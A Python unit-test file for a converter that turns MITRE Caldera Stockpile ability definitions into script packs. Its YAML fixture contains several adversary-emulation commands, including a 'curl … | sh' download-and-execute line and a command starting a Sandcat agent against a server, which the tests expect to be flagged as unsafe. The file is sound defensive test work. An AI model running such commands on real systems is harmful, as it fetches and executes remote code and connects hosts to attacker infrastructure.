#!/usr/bin/env python3
"""Unit tests for the MITRE Stockpile converter. No ability is executed."""

from __future__ import annotations

import json
import subprocess
import sys
import tempfile
import textwrap
import unittest
from pathlib import Path

CONVERTER = Path(__file__).resolve().parent / "convert_stockpile.py"


class StockpileConverterTests(unittest.TestCase):
    def test_representative_stockpile_features(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            abilities = root / "stockpile" / "data" / "abilities" / "discovery"
            abilities.mkdir(parents=True)
            output = root / "output"

            (abilities / "representative.yml").write_text(
                textwrap.dedent(
                    """
                    - id: simple-ability
                      name: Representative Discovery
                      description: Safe converter fixture
                      tactic: discovery
                      technique:
                        attack_id: T1057
                        name: Process Discovery
                      platforms:
                        windows:
                          psh,pwsh:
                            command: "Write-Output '#{domain.user.password}'"
                            cleanup: "Write-Output '#{host.dir.staged}'"
                            parsers:
                              plugins.stockpile.app.parsers.basic:
                                - source: host.process.id
                            requirements:
                              - plugins.stockpile.app.requirements.paw_provenance:
                                  - source: host.dir.staged
                        linux,darwin:
                          sh:
                            command: "ps aux | grep '#{host.user.name}'"
                    - id: payload-ability
                      name: Payload Variant
                      tactic: discovery
                      technique:
                        attack_id: T1018
                        name: Remote System Discovery
                      platforms:
                        windows:
                          psh:
                            command: "Import-Module ./payload.ps1"
                            payloads:
                              - payload.ps1
                    - id: build-ability
                      name: Build Variant
                      tactic: discovery
                      technique:
                        attack_id: T1057
                        name: Process Discovery
                      platforms:
                        windows:
                          cmd:
                            build_target: fixture.exe
                            language: csharp
                            code: "class Fixture {}"
                    - id: unknown-executor
                      name: Unknown Executor
                      tactic: discovery
                      technique:
                        attack_id: T1082
                        name: System Information Discovery
                      platforms:
                        windows:
                          shellcode_amd64:
                            command: "ignored"
                    - id: unsafe-runtime
                      name: Start Sandcat Agent
                      tactic: discovery
                      technique:
                        attack_id: T1057
                        name: Process Discovery
                      platforms:
                        windows:
                          psh:
                            command: "C:/Users/Public/s4ndc4t.exe -server #{server}"
                    - id: parameterized-download
                      name: Parameterized Download and Execute
                      tactic: discovery
                      technique:
                        attack_id: T1057
                        name: Process Discovery
                      platforms:
                        linux:
                          sh:
                            command: "curl #{remote.url} | sh"
                    """
                ).strip()
                + "\n",
                encoding="utf-8",
            )
            completed = subprocess.run(
                [
                    sys.executable,
                    str(CONVERTER),
                    "--stockpile-dir",
                    str(root / "stockpile"),
                    "--out-dir",
                    str(output),
                    "--tactic",
                    "discovery",
                    "--no-update-catalog",
                ],
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(completed.returncode, 0, completed.stdout + completed.stderr)

            pack = json.loads((output / "stockpile-discovery-v1.json").read_text(encoding="utf-8"))
            report = json.loads((output / "conversion-report.json").read_text(encoding="utf-8"))
            scripts = pack["scripts"]

            self.assertEqual(len(scripts), 3)
            self.assertEqual({script["platform"] for script in scripts}, {"windows", "linux", "macos"})
            self.assertEqual({script["executor"] for script in scripts}, {"powershell", "bash"})
            self.assertTrue(all(script["name"].startswith("STOCKPILE - ") for script in scripts))

            windows = next(script for script in scripts if script["platform"] == "windows")
            self.assertIn("#{stockpile_discovery_1057_domain_user_password}", windows["command"])
            self.assertIn("#{stockpile_discovery_1057_host_dir_staged}", windows["cleanup_command"])
            self.assertEqual(
                set(windows["required_tags"]),
                {
                    "stockpile_discovery_1057_domain_user_password",
                    "stockpile_discovery_1057_host_dir_staged",
                },
            )
            tags = {
                tag["key"]: tag
                for category in pack["tag_categories"]
                for tag in category["tags"]
            }
            self.assertTrue(tags["stockpile_discovery_1057_domain_user_password"]["sensitive"])
            self.assertEqual(tags["stockpile_discovery_1057_domain_user_password"]["default"], "")

            summary = report["summary"]
            self.assertEqual(summary["generated_scripts"], 3)
            self.assertEqual(len(report["unsupported_build_variants"]), 1)
            self.assertEqual(len(report["unsupported_executors"]), 1)
            self.assertEqual(len(report["unsafe_runtime_variants"]), 2)
            self.assertEqual(len(report["payload_issues"]), 1)
            self.assertEqual(len(report["parser_metadata"]), 1)
            self.assertEqual(len(report["requirement_metadata"]), 1)
            self.assertEqual(len(report["malformed_files"]), 0)

            script_names = {script["name"] for script in scripts}
            for chain in pack["chains"]:
                self.assertTrue(set(chain["script_refs"]).issubset(script_names))

            first_pack = (output / "stockpile-discovery-v1.json").read_bytes()
            first_report = (output / "conversion-report.json").read_bytes()
            repeated = subprocess.run(
              completed.args,
              check=False,
              capture_output=True,
              text=True,
            )
            self.assertEqual(repeated.returncode, 0, repeated.stdout + repeated.stderr)
            self.assertEqual(first_pack, (output / "stockpile-discovery-v1.json").read_bytes())
            self.assertEqual(first_report, (output / "conversion-report.json").read_bytes())

    def test_malformed_yaml_fails_without_writing_output(self) -> None:
        with tempfile.TemporaryDirectory() as temporary:
            root = Path(temporary)
            abilities = root / "stockpile" / "data" / "abilities" / "discovery"
            abilities.mkdir(parents=True)
            output = root / "output"
            (abilities / "malformed.yml").write_text(
                "- id: [unterminated\n",
                encoding="utf-8",
            )

            completed = subprocess.run(
                [
                    sys.executable,
                    str(CONVERTER),
                    "--stockpile-dir",
                    str(root / "stockpile"),
                    "--out-dir",
                    str(output),
                    "--tactic",
                    "discovery",
                    "--no-update-catalog",
                ],
                check=False,
                capture_output=True,
                text=True,
            )

            self.assertNotEqual(completed.returncode, 0)
            self.assertFalse((output / "stockpile-discovery-v1.json").exists())
            self.assertFalse((output / "conversion-report.json").exists())


if __name__ == "__main__":
    unittest.main()
